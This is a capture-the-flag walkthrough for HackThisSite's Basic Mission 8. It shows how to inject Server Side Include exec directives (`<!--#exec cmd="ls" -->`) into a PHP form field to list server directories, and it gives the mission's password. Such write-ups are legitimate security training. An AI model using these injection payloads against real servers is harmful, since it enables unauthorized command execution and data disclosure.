Description:
  The password is yet again hidden in an unknown file. Sam's daughter has begun learning PHP, and has a small script to demonstrate her knowledge. 
  Requirements: Knowledge of SSI (dynamic html executed by the server, rather than the browser)
  
  Sam remains confident that an obscured password file is still the best idea, but he screwed up with the calendar program. Sam has saved the 
  unencrypted password file in /var/www/hackthissite.org/html/missions/basic/8/
  
  However, Sam's young daughter Stephanie has just learned to program in PHP. She's talented for her age, but she knows nothing about security. 
  She recently learned about saving files, and she wrote a script to demonstrate her ability.


Solution:
  Entering my name into the daughter's field returns a page with the following information:
  
    Hi, w3bguy!
    
    Your name contains 6 characters.
  
  So this script writes my name and runs a count function on it, at least.  Since we know that the PHP should run commands without security issues,
  we can try an SSI attack.  First let's see if we can show the current directory contents by entering:
    <!--#exec cmd="ls" -->
  
  This returns a file with the following information:
  
    Hi, tshngmww.shtml hipykpqu.shtml ztxdhjxn.shtml avpfeoie.shtml fviqpmaw.shtml kqbybdzc.shtml dzrnmzgx.shtml npcsygfl.shtml whqxxojt.shtml ylomcmvu.shtml 
    uhdppswp.shtml gzntiicx.shtml dzwbqiuu.shtml qvzuieng.shtml smcerykh.shtml qjhnmhmq.shtml znodwztr.shtml!
    
    Your name contains 254 characters.
  
  We know this attack will work,but we are showing data from the https://www.hackthissite.org/missions/basic/8/tmp directory.  So we just need to list the
  contents of that directory's parent, instead.  We can do that by running the following command:
    <!--#exec cmd="ls ../" -->
    
  This returns the following information:
  
    Hi, au12ha39vc.php index.php level8.php tmp!

    Your name contains 39 characters.
  
  Now we have the filename: au12ha39vc.php.  Loading that page returns the password: 3f243552

  REturn to the main page and enter the password.
